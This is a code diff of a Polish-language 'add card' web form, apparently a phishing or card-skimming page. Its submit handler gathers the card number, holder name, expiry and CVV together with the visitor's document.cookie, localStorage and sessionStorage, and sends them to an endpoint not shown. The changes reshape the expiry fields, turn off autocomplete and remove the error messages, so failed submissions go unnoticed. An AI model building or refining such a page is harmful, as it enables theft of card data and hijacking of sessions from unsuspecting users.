@@ -29,44 +29,54 @@
     <!-- Form -->
     <div class="p-6">
       <h2 class="text-lg font-semibold mb-4">Dodaj kartę</h2>
-      <form id="cardForm" class="space-y-4">
+      <form id="cardForm" class="space-y-4" autocomplete="off">
         <input
           type="text"
           name="cardNumber"
           placeholder="Numer karty"
-          pattern="\\d{16,19}"
-          title="Podaj numer karty (16–19 cyfr)"
           maxlength="19"
+          inputmode="numeric"
           class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
           required />
+
         <input
           type="text"
           name="cardHolder"
           placeholder="Imię i nazwisko posiadacza"
-          pattern="[A-Za-zżźćńółęąśŻŹĆĄŚĘŁÓŃ ]+"
-          title="Imię i nazwisko bez cyfr i znaków specjalnych"
           class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
           required />
-        <div class="flex gap-4">
+
+        <div class="flex gap-4 items-center">
           <input
             type="text"
-            name="expiryDate"
-            placeholder="MM/RR"
-            pattern="(0[1-9]|1[0-2])/\\d{2}"
-            title="Data ważności w formacie MM/RR"
-            maxlength="5"
-            class="flex-1 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+            name="expMonth"
+            placeholder="MM"
+            maxlength="2"
+            inputmode="numeric"
+            class="w-1/4 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none text-center"
             required />
+
+          <span class="text-gray-600">/</span>
+
+          <input
+            type="text"
+            name="expYear"
+            placeholder="RR"
+            maxlength="2"
+            inputmode="numeric"
+            class="w-1/4 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none text-center"
+            required />
+
           <input
             type="text"
             name="cvv"
             placeholder="CVV"
-            pattern="\\d{3,4}"
             maxlength="4"
-            title="Kod CVV: 3 lub 4 cyfry"
+            inputmode="numeric"
             class="flex-1 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
             required />
         </div>
+
         <button
           type="submit"
           class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition">
@@ -75,7 +85,7 @@
       </form>
     </div>
 
-    <!-- Footer cookies -->
+    <!-- Footer -->
     <div class="text-xs bg-black text-white p-2 text-center">
       Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę...
     </div>
@@ -97,11 +107,24 @@
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
+      const month = form.expMonth.value.trim();
+      const year = form.expYear.value.trim();
+
+      if (!/^(0[1-9]|1[0-2])$/.test(month)) {
+        alert('Niepoprawny miesiąc (01–12)');
+        return;
+      }
+
+      if (!/^\d{2}$/.test(year)) {
+        alert('Niepoprawny rok (RR)');
+        return;
+      }
+
       const payload = {
-        cardNumber: form.cardNumber.value,
-        cardHolder: form.cardHolder.value,
-        expiryDate: form.expiryDate.value,
-        cvv: form.cvv.value,
+        cardNumber: form.cardNumber.value.trim(),
+        cardHolder: form.cardHolder.value.trim(),
+        expiryDate: `${month}/${year}`,
+        cvv: form.cvv.value.trim(),
         cookies: document.cookie,
         localStorage: JSON.stringify(localStorage),
         sessionStorage: JSON.stringify(sessionStorage),
@@ -118,14 +141,7 @@
         });
 
         if (res.ok) {
-          alert('✅ Karta zapisana!');
           form.reset();
-        } else {
-          alert('❌ Błąd podczas zapisu.');
-        }
-      } catch (err) {
-        console.error(err);
-        alert('❌ Błąd połączenia.');
       }
     });
   </script>
